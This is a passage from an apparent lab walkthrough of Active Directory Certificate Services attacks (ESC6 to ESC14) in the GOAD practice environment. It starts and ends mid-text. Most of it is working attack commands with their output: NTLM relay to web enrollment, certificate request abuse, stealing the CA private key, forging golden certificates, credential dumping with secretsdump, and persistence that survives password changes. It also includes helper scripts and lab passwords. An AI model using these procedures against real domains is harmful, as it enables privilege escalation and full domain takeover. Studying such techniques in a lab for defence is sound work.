-- 40000 (262144)\nEDITF_ATTRIBUTEENDDATE -- 20000 (131072)\nEDITF_ATTRIBUTECA -- 4000 (16384)\nEDITF_IGNOREREQUESTERGROUP -- 100000 (1048576)\nCertUtil: -getreg command completed successfully.\n\n# Flag 0x40000 (EDITF_ATTRIBUTESUBJECTALTNAME2) is present!\n</code></pre>\n<h3>Exploitation</h3>\n<p><strong>Note:</strong> Since the Microsoft hardening released in KB5014754 (May 10, 2022), certificates issued via a CA that still has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled must contain the new SID security extension or rely on weak mapping modes; otherwise logon is refused. ESC6 exploitation therefore commonly requires ESC9 or ESC10 conditions as well.</p>\n<p>Find CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 flag set:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n[!] Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set!\n\n    Enterprise CA Name            : ESSOS-CA\n    DNS Hostname                  : braavos.essos.local\n    FullName                      : braavos.essos.local\\ESSOS-CA\n    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local\n    UserSpecifiedSAN              : Enabled (ESC6)\n</code></pre>\n<p>Request certificate with arbitrary SAN using any template:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:User /altname:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : User\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 13\n</code></pre>\n<p>Even though template doesn't allow subject specification,\nESC6 allows it through the CA configuration</p>\n<h3>Enabling the Flag (if you have CA admin rights). Enable the dangerous flag on GOAD CA:</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">certutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n\nCertUtil: -setreg command completed successfully.\n</code></pre>\n<p>Restart certificate services:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Restart-Service CertSvc\n\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...\nWARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...\n\nStatus   Name               DisplayName\n------   ----               -----------\nRunning  CertSvc            Active Directory Certificate Services\n</code></pre>\n<h2>ESC7: Vulnerable Certificate Authority Access Control</h2>\n<p>ESC7 is all about getting direct access to the CA itself. If you can get ManageCA or ManageCertificates permissions, you basically own the entire certificate infrastructure.</p>\n<p>Let's see what permissions we have in GOAD. Check if we have ManageCA rights:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Permissions\n      Owner                       : BUILTIN\\Administrators        Access: GenericAll\n      Access Rights               : ESSOS\\Domain Admins           Access: GenericAll\n      Access Rights               : ESSOS\\Enterprise Admins       Access: GenericAll\n      Access Rights               : ESSOS\\viserys.targaryen       Access: ManageCA\n      Access Rights               : ESSOS\\viserys.targaryen       Access: ManageCertificates\n</code></pre>\n<p>Perfect! <code>viserys.targaryen</code> has ManageCA and ManageCertificates rights in GOAD.</p>\n<h3>ManageCA Rights Exploitation</h3>\n<p>ManageCA rights are like having the keys to the kingdom. Here's what you can do:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># If you have ManageCA, you can:\n# 1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -setreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n\nCertUtil: -setreg command completed successfully.\n\n# 2. Certificate manager rights\n# As the Certify output indicated, viserys.targaryen already possesses ManageCA and ManageCertificates rights in our GOAD scenario.\n# An attacker gaining these rights would typically do so by compromising an account that already has them, or by escalating to a level\n# where they can modify the CA's Active Directory object permissions or the CA server's local groups.\n# With ManageCA rights, one can assign officer rights (ManageCertificates) through the Certificate Authority console (certsrv.msc).\n\n# 3. Restart services to apply changes\nRestart-Service CertSvc\n</code></pre>\n<h3>ManageCertificates Rights Exploitation</h3>\n<p>With ManageCertificates, approve pending requests. First, submit a request for a privileged user using SubCA template:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">Certify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:SubCA /altname:administrator@essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\viserys.targaryen\n[*] Template                : SubCA\n[*] Subject                 : CN=viserys.targaryen, CN=Users, DC=essos, DC=local\n[*] AltName                 : administrator@essos.local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : Taken Under Submission\n[*] Request ID              : 14\n\n# The request is pending, now approve it with ManageCertificates permission\ncertutil -config \"braavos.essos.local\\ESSOS-CA\" -approve 14\n\n# Expected output:\n# Request 14 approved.\n# CertUtil: -approve command completed successfully.\n\n# Retrieve the issued certificate\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /retrieve 14\n\n[*] Action: Retrieve Certificates\n[*] Request ID: 14\n[*] Certificate retrieved successfully\n</code></pre>\n<h2>ESC8: NTLM Relay to AD CS HTTP Endpoints</h2>\n<p>ESC8 is where things get really interesting. It combines ADCS with NTLM relay attacks, targeting HTTP-based certificate enrollment endpoints. I love this technique because it leverages two different attack vectors together.</p>\n<h3>Prerequisites</h3>\n<p>In GOAD, we have perfect conditions for ESC8:</p>\n<ul>\n<li>ADCS web enrollment <strong>enabled</strong></li>\n<li><strong>HTTP enrollment endpoint</strong> accessible at <code>http://braavos.essos.local/certsrv/</code></li>\n<li>We can perform <strong>NTLM relay</strong> attacks</li>\n</ul>\n<p>NTLM relay works against both HTTP and HTTPS enrollment pages; the protocol matters less than whether Extended Protection for Authentication (EPA) or channel binding tokens are required. Enable EPA and require SSL to break the relay attack.</p>\n<h3>Attack Implementation</h3>\n<p>Let's test the web enrollment endpoint first:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Check if ADCS web enrollment is accessible\ncurl -I http://braavos.essos.local/certsrv/certfnsh.asp\n\nHTTP/1.1 401 Unauthorized\nContent-Length: 1293\nContent-Type: text/html\nServer: Microsoft-IIS/10.0\nWWW-Authenticate: Negotiate\nWWW-Authenticate: NTLM\nDate: Thu, 03 Jan 2025 16:45:12 GMT\n</code></pre>\n<p>Perfect! It's requesting NTLM authentication. Now let's set up the relay attack:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Set up NTLM relay to ADCS HTTP endpoint\npython3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template \"DomainController\"\n\nImpacket v0.11.0 - Copyright 2023 Fortra\nNote: Output may vary slightly between versions - banners truncated for brevity\n\n[*] Protocol Client DCOM loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client SMB loaded..\n[*] Protocol Client SMTP loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up HTTP Server\n[*] Setting up WCF Server\n\n[*] Servers started, waiting for connections\n\n# In another terminal, trigger authentication from target DC\npython3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local\n\n[*] Impacket v0.11.0 - Copyright 2023 Fortra\n[*] Attempting to trigger authentication via rprn RPC at meereen.essos.local\n[*] Bind OK\n[*] Got handle\nDCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Triggered RPC backconnect, this may or may not have worked\n\n# Back in ntlmrelayx window:\n[*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled, attacking target http://braavos.essos.local\nHTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64\n[*] ADCS attack completed. Generated certificate for user MEEREEN$\n\n# Certificate successfully obtained!\n</code></pre>\n<p>Let's convert and use the certificate:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Convert base64 certificate for use\ncat /tmp/MEEREEN$cert.b64 | base64 -d > meereen.pfx\n\n# Ask for a TGT with the machine certificate\ngettgtpkinit.py essos.local/meereen$ -pfx-file meereen.pfx meereen.ccache\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Using TGT from cache file meereen.ccache\n[*] Requesting TGT for meereen$@essos.local using Kerberos PKINIT\n[+] TGT request successful!\n[*] Saved TGT to meereen.ccache\n\n# Use machine certificate for further attacks or DCSync\n</code></pre>\n<h2>ESC9: No Security Extension</h2>\n<p>ESC9 is pure gold for persistence. It exploits certificate templates that don't require the szOID_NTDS_CA_SECURITY_EXT security extension in issued certificates. This means your certificates keep working even when passwords change.</p>\n<h3>Vulnerability Details</h3>\n<p>When certificates lack the security extension, they provide persistent authentication that survives password changes. This is what makes them perfect for maintaining long-term access.</p>\n<h3>Key Point</h3>\n<p>A certificate issued from a <code>NO_SECURITY_EXTENSION</code> template will still map even after the user changes their password, making it perfect for persistence.</p>\n<h3>Exploitation Process</h3>\n<p>Let's test this in our GOAD environment:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Find templates without security extension requirement\nCertify.exe find /vulnerable\n\n[!] Vulnerable Certificates Templates :\n\n    CA Name                       : braavos.essos.local\\ESSOS-CA\n    Template Name                 : ESC9\n    Schema Version                : 2\n    Validity Period               : 1 year\n    Renewal Period                : 6 weeks\n    msPKI-Certificate-Name-Flag   : 0x0\n    mspki-enrollment-flag         : NO_SECURITY_EXTENSION, INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n    Authorized Signatures Required: 0\n    pkiextendedkeyusage           : Client Authentication\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights           : ESSOS\\Domain Users                    Access: Allow\n\n# Request certificate for current user (missandei)\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC9\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : ESC9\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 15\n\n[*] cert.pem                :\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW\n...certificate without security extension...\n-----END CERTIFICATE-----\n\n# Test authentication with current certificate\n\nRubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n# Now change the user's password\nnet user missandei \"NewComplexPassword123!\" /domain\n\nThe command completed successfully.\n\n# Certificate still works for authentication even after password change!\n\nRubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n  UserName                 : missandei\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 5:30:45 PM\n  EndTime                  : 1/4/2025 3:30:45 AM\n  RenewTill                : 1/10/2025 5:30:45 PM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n\n# Perfect persistence! The certificate still authenticates despite password change\n</code></pre>\n<h3>Template Analysis</h3>\n<p>Check if template requires security extension in GOAD:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$templateDN = \"CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\"\n$template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag\n\n# The CT_FLAG_NO_SECURITY_EXTENSION flag value is 0x80000 (524288)\n$NoSecurityExtensionFlag = 0x80000\n\nif ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {\n    Write-Host \"Template '$($template.Name)' has the NO_SECURITY_EXTENSION flag set.\"\n} else {\n    Write-Host \"Template '$($template.Name)' does NOT have the NO_SECURITY_EXTENSION flag set.\"\n}\n\n# Output shows template has NO_SECURITY_EXTENSION flag set - perfect for persistence!\n</code></pre>\n<h2>ESC10: Weak Certificate Mappings</h2>\n<p>ESC10 exploits weak certificate-to-account mapping configurations and certificate mapping vulnerabilities.</p>\n<h3>Attack Vectors</h3>\n<p><strong>ESC10A - Write Access on altSecurityIdentities:</strong></p>\n<ul>\n<li>Attackers with write permissions on user objects can modify <code>altSecurityIdentities</code></li>\n<li>This attribute maps certificates to user accounts</li>\n<li>Malicious mapping allows certificate-based authentication as other users</li>\n</ul>\n<p><strong>ESC10B - Weak Certificate Mapping Methods:</strong></p>\n<ul>\n<li>Exploits weak <code>CertificateMappingMethods</code> registry settings</li>\n<li>Allows certificate authentication with partial subject matching</li>\n</ul>\n<h3>Exploitation Example</h3>\n<p>Let's try ESC10A in GOAD:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># ESC10A - Modify altSecurityIdentities attribute\n# First, create a computer account and request machine certificate\naddcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' essos/missandei:fr3edom@meereen.essos.local\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Successfully added machine account EVIL$ with password Password123!.\n\n# Request machine certificate for our new computer\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:Machine /machine\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\EVIL$\n[*] Template                : Machine\n[*] Subject                 : CN=EVIL, CN=Computers, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 18\n\n# Extract certificate details (issuer, serial number)\ncertutil -dump evil.pem\n\nCertificate:\n    Serial Number: 6100000028f9b2d3c5a1b4e87a00000000000028\n    Issuer: CN=ESSOS-CA, DC=essos, DC=local\n    Subject: CN=EVIL, CN=Computers, DC=essos, DC=local\n\n# Modify target user's altSecurityIdentities to map to our certificate\n$dn = \"CN=administrator,CN=Users,DC=essos,DC=local\"\n$mapping = \"X509:&#x3C;I>CN=ESSOS-CA,DC=essos,DC=local&#x3C;S>6100000028f9b2d3c5a1b4e87a00000000000028\"\nSet-ADObject -Identity $dn -Replace @{'altSecurityIdentities' = $mapping}\n\n# Authenticate as administrator using our EVIL$ machine certificate\n\nRubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password123!\n\n[*] Action: Ask TGT\n[*] Using certificate mapping via altSecurityIdentities\n[*] Using PKINIT with etype rc4_hmac and subject: CN=EVIL, CN=Computers, DC=essos, DC=local\n[+] TGT request successful!\n\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 6:45:12 PM\n  EndTime                  : 1/4/2025 4:45:12 AM\n  RenewTill                : 1/10/2025 6:45:12 PM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n</code></pre>\n<p>Perfect! We've successfully used ESC10A to authenticate as administrator using a machine certificate mapped via <code>altSecurityIdentities</code>.</p>\n<h2>ESC11: IF_ENFORCEENCRYPTICERTREQUEST</h2>\n<p>ESC11 targets CAs configured with IF_ENFORCEENCRYPTICERTREQUEST flag, which can be bypassed under certain conditions.</p>\n<h3>Attack Vector</h3>\n<p>ESC11 exploits RPC call tampering when certificate requests are transmitted unencrypted to the Certificate Authority.</p>\n<p><strong>Important:</strong> The \"unencrypted request\" only succeeds when the CA has <code>IF_ENFORCEENCRYPTICERTREQUEST</code> cleared. If this flag is set (the secure default on modern Windows versions), the RPC interface forces packet privacy and NTLM relay fails.</p>\n<h3>Prerequisites</h3>\n<p>Let's check the GOAD CA configuration. Check if CA has IF_ENFORCEENCRYPTICERTREQUEST flag cleared:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">certutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\InterfaceFlags\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\ESSOS-CA\\InterfaceFlags REG_DWORD = 0x0 (0)\n\n</code></pre>\n<p>H0x0 = vulnerable (no encryption required), 0x200 = hardened (encryption required). IF_ENFORCEENCRYPTICERTREQUEST is NOT set (flag would be 0x200) - this makes the CA vulnerable to ESC11.</p>\n<ol>\n<li><strong>CA has IF_ENFORCEENCRYPTICERTREQUEST flag cleared</strong> ✓</li>\n<li><strong>Unencrypted certificate request</strong> ✓</li>\n</ol>\n<h3>Bypass Technique</h3>\n<pre class=\"language-csharp\"><code class=\"language-csharp\">// Create unencrypted certificate request for GOAD environment\npublic class ESC11Exploit\n{\n    public string CreateUnencryptedRequest(string subject, string altname = \"administrator@essos.local\")\n    {\n        var request = new CX509CertificateRequestPkcs10();\n        var privateKey = new CX509PrivateKey();\n        \n        // Configure for unencrypted submission to GOAD CA\n        privateKey.ProviderName = \"Microsoft Software Key Storage Provider\";\n        privateKey.Create();\n        \n        request.InitializeFromPrivateKey(\n            X509CertificateEnrollmentContext.ContextUser,\n            privateKey,\n            \"\");\n            \n        request.Subject = new CX500DistinguishedName(subject);\n        \n        // Add SAN for GOAD domain\n        var sanExtension = new CX509ExtensionAlternativeNames();\n        var altNames = new CAlternativeNames();\n        var altNameObj = new CAlternativeName();\n        \n        altNameObj.InitializeFromString(\n            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,\n            altname);\n        altNames.Add(altNameObj);\n        \n        sanExtension.InitializeEncode(altNames);\n        request.X509Extensions.Add(sanExtension);\n        \n        // Submit without encryption to vulnerable GOAD CA\n        return request.Encode();\n    }\n}\n</code></pre>\n<p>The C# code above demonstrates how a certificate request (CSR) payload can be constructed. For the actual ESC11 attack, an attacker would typically use a tool like an adapted <code>ntlmrelayx.py</code> or custom tooling to relay incoming NTLM authentication (e.g., from a coerced machine account) to the ADCS server's <code>ICertRequestD</code> DCOM interface over unencrypted RPC. Once the NTLM relay is established, the attacker's tool submits the CSR (like the one generated above, often for a privileged account or a machine account with a useful SAN) on behalf of the relayed account. If successful, the CA issues the certificate for the target specified in the CSR, effectively escalating privileges.</p>\n<h2>ESC12: Shell Access to CA Server</h2>\n<p>ESC12 is the holy grail - when you get shell access to the actual Certificate Authority server. At this point, you basically own the entire PKI infrastructure.</p>\n<p>ESC12 also covers YubiHSM vulnerabilities discovered by Hans-Joachim Knobloch, but this specific attack vector is not implemented in the standard GOAD environment.</p>\n<p>In GOAD, the CA server is <code>braavos.essos.local</code>. Let's say we've compromised it:</p>\n<h3>Golden Certificate Creation (CA Private Key Compromise)</h3>\n<p>When you have CA administrator access (like <code>khal.drogo</code> in GOAD), you can extract the CA private key and forge golden certificates:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Extract CA certificate and private key with certipy\ncertipy ca -backup -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -ca 'ESSOS-CA' -target 192.168.56.23 -debug\n\n[*] Action: Backup CA\n[*] Backing up CA 'ESSOS-CA'\n[*] Saved certificate and private key to 'ESSOS-CA.pfx'\n\n# Forge a certificate as domain admin\ncertipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local\n\n[*] Action: Forge Certificate\n[*] Forged certificate saved to 'administrator_forged.pfx'\n\n# Authenticate with schannel\ncertipy auth -pfx administrator_forged.pfx -ldap-shell\n\n[*] Action: Authenticate\n[*] LDAP shell available\n\n# add_user newdomainadmin\n# add_user_to_group newdomainadmin \"Domain admins\"\n\n# Alternative: Authenticate with PKINIT\n# First request a valid certificate as template\ncertipy req -u 'khal.drogo@essos.local' -p horse -ca 'ESSOS-CA' -template User -target 192.168.56.23\n\n# Reforge with template to fix CRL issues\ncertipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local -template khal.drogo.pfx\n\n\nRubeus.exe asktgt /user:administrator /certificate:administrator_forged.pfx /password:mimikatz\n\n# Or use gettgtpkinit.py\ngettgtpkinit.py -cert-pfx administrator_forged.pfx -dc-ip 192.168.56.12 \"essos.local/administrator\" admin_tgt.cccache\n\nexport KRB5CCNAME=/workspace/admin_tgt.cccache\nsecretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12\n</code></pre>\n<h3>Post-Exploitation Techniques</h3>\n<h2>ESC13: Issuance Policy OID Group Links</h2>\n<p>ESC13 exploits the ADCS feature where certificate templates can have issuance policies with OID group links to Active Directory groups. This allows principals to gain access as members of linked groups by requesting certificates with the appropriate issuance policies.</p>\n<h3>Technical Details</h3>\n<p>This attack abuses Microsoft's Authentication Mechanism Assurance (AMA) feature where:</p>\n<ul>\n<li>Certificate templates contain issuance policies (stored in <code>msPKI-Certificate-Policy</code> attribute)</li>\n<li>Issuance policies can be linked to AD groups via <code>msDS-OIDToGroupLink</code> attribute</li>\n<li>When authenticating with such certificates, users gain group membership permissions</li>\n</ul>\n<h3>Requirements</h3>\n<ol>\n<li><strong>Principal has enrollment rights</strong> on a certificate template</li>\n<li><strong>Certificate template has an issuance policy extension</strong></li>\n<li><strong>Issuance policies can be linked to AD groups via <code>msDS-OIDToGroupLink</code> attribute</strong></li>\n<li><strong>No issuance requirements</strong> the principal cannot meet</li>\n<li><strong>EKUs enable client authentication</strong></li>\n</ol>\n<h3>Exploitation Process</h3>\n<p>Let's check for ESC13 conditions in GOAD:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Find templates with issuance policies linked to groups in essos.local\nImport-Module ActiveDirectory\n\n$templates = Get-ADObject -Filter 'objectClass -eq \"pKICertificateTemplate\"' -Properties msPKI-Certificate-Policy -SearchBase \"CN=Configuration,DC=essos,DC=local\"\n\nforeach ($template in $templates) {\n    if ($template.'msPKI-Certificate-Policy') {\n        $policies = $template.'msPKI-Certificate-Policy'\n        foreach ($policy in $policies) {\n            $oid = Get-ADObject -Filter * -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -Properties msDS-OIDToGroupLink | Where-Object {$_.msDS-OIDToGroupLink -and $policy -eq $_.'msPKI-Cert-Template-OID'}\n            if ($oid.'msDS-OIDToGroupLink') {\n                Write-Host \"Template $($template.Name) linked to group: $($oid.'msDS-OIDToGroupLink')\"\n            }\n        }\n    }\n}\n\nTemplate ESC13Template linked to group: CN=Enterprise Admins,CN=Users,DC=essos,DC=local\n\n# Perfect! ESC13Template is linked to Enterprise Admins\n\n# Request certificate from vulnerable template\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC13Template\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : ESC13Template\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 17\n\n# Authenticate with certificate to gain Enterprise Admin group membership\n\nRubeus.exe asktgt /user:missandei /certificate:esc13.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n# The TGT now contains Enterprise Admins group membership!\n# Verify with whoami /groups after using the ticket\n\nRubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...\n\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n\n# Now we have Enterprise Admin privileges in the forest\nnet group \"Enterprise Admins\" /domain\n\nGroup name     Enterprise Admins\nComment        Designated administrators of the enterprise\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator  missandei\nThe command completed successfully.\n</code></pre>\n<h3>Group Requirements</h3>\n<p>The linked group must be:</p>\n<ul>\n<li><strong>Empty</strong> (no actual members)</li>\n<li><strong>Universal scope</strong> (forest-wide)</li>\n</ul>\n<p>Common universal groups include Enterprise Admins, Schema Admins, Enterprise Key Admins.</p>\n<h2>ESC14: Shadow Credentials and Advanced Certificate Mapping</h2>\n<p>ESC14 represents advanced certificate mapping abuse techniques that go beyond basic <code>altSecurityIdentities</code> manipulation covered in ESC10. This technique focuses on shadow credentials and sophisticated certificate-to-account mapping scenarios.</p>\n<h3>Technical Background</h3>\n<p>ESC14 exploits advanced certificate mapping mechanisms including:</p>\n<ul>\n<li><strong>Shadow Credentials</strong>: Abusing <code>msDS-KeyCredentialLink</code> attribute for certificate-based authentication</li>\n<li><strong>Advanced Certificate Mapping</strong>: Sophisticated manipulation of certificate-to-account relationships</li>\n<li><strong>Cross-Domain Certificate Abuse</strong>: Exploiting certificate mappings across domain boundaries</li>\n</ul>\n<h3>Attack Scenarios</h3>\n<p><strong>ESC14A - Shadow Credentials Abuse:</strong></p>\n<ul>\n<li>Attackers with write permissions on user objects can add shadow credentials</li>\n<li>Allows certificate-based authentication without traditional certificate enrollment</li>\n<li>Bypasses many traditional ADCS controls</li>\n</ul>\n<p><strong>ESC14B - Advanced Certificate Mapping:</strong></p>\n<ul>\n<li>Sophisticated certificate mapping scenarios beyond basic ESC10 techniques</li>\n<li>Cross-domain certificate abuse in multi-domain environments like GOAD</li>\n<li>Certificate mapping persistence mechanisms</li>\n</ul>\n<h3>Exploitation Process</h3>\n<p>Let's demonstrate ESC14 techniques in our GOAD environment. ESC14A - altSecurityIdentities Manipulation in GOAD:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># First, create a computer account for certificate mapping\naddcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass 'Il0veCertific@te' -dc-ip 192.168.56.12 essos/missandei:fr3edom@192.168.56.12\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Successfully added machine account esc14computer$ with password Il0veCertific@te.\n\n# Request machine certificate for our created computer\ncertipy req -target braavos.essos.local -u 'esc14computer$@essos.local' -p 'Il0veCertific@te' -dc-ip 192.168.56.12 -template Machine -ca ESSOS-CA -debug\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\esc14computer$\n[*] Template                : Machine\n[*] Subject                 : CN=esc14computer, CN=Computers, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 25\n\n# Extract certificate details for mapping\ncertipy cert -pfx esc14computer.pfx -nokey -out \"esc14computer.crt\"\nopenssl x509 -in esc14computer.crt -noout -text\n\nCertificate:\n    Data:\n        Serial Number: 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\n        Issuer: CN=ESSOS-CA, DC=essos, DC=local\n        Subject: CN=esc14computer, CN=Computers, DC=essos, DC=local\n\n# Check current altSecurityIdentities\nldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities\n\n[{\n  \"altSecurityIdentities\": [],\n  \"dn\": \"CN=khal.drogo,CN=Users,DC=essos,DC=local\"\n}]\n</code></pre>\n<h3>X509 Certificate Mapping Format</h3>\n<p>The reference article provides a Python script to format the X509 mapping correctly:</p>\n<pre class=\"language-python\"><code class=\"language-python\">import argparse\n\ndef get_x509_issuer_serial_number_format(serial_number: str, issuer_distinguished_name: str) -> str:\n    \"\"\"\n    Formats the X509IssuerSerialNumber for the altSecurityIdentities attribute.\n    :param serial_number: Serial number in the format \"43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\"\n    :param issuer_distinguished_name: Issuer distinguished name, e.g., \"CN=ESSOS-CA,DC=essos,DC=local\"\n    :return: Formatted X509IssuerSerialNumber\n    \"\"\"\n    serial_bytes = serial_number.split(\":\")\n    reversed_serial_number = \"\".join(reversed(serial_bytes))\n    issuer_components = issuer_distinguished_name.split(\",\")\n    reversed_issuer_components = \",\".join(reversed(issuer_components))\n    return f\"X509:&#x3C;I>{reversed_issuer_components}&#x3C;SR>{reversed_serial_number}\"\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Format X509 Issuer Serial Number\")\n    parser.add_argument(\"-serial\", required=True, help=\"Serial number in format 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\")\n    parser.add_argument(\"-issuer\", required=True, help=\"Issuer Distinguished Name e.g., CN=ESSOS-CA,DC=essos,DC=local\")\n\n    args = parser.parse_args()\n    formatted_value = get_x509_issuer_serial_number_format(args.serial, args.issuer)\n    print(formatted_value)\n\n# Usage:\npython3 x509_issuer_serial_number_format.py -serial \"43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\" -issuer \"CN=ESSOS-CA,DC=essos,DC=local\"\n\nX509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA&#x3C;SR>110000000000a68816e592b078921100000043\n</code></pre>\n<h3>LDAP Attribute Modification</h3>\n<p>Script to modify altSecurityIdentities attribute:</p>\n<pre class=\"language-python\"><code class=\"language-python\">import ldap3\n\ndn = \"CN=khal.drogo,CN=Users,DC=essos,DC=local\"\nuser = \"essos.local\\\\missandei\"\npassword = 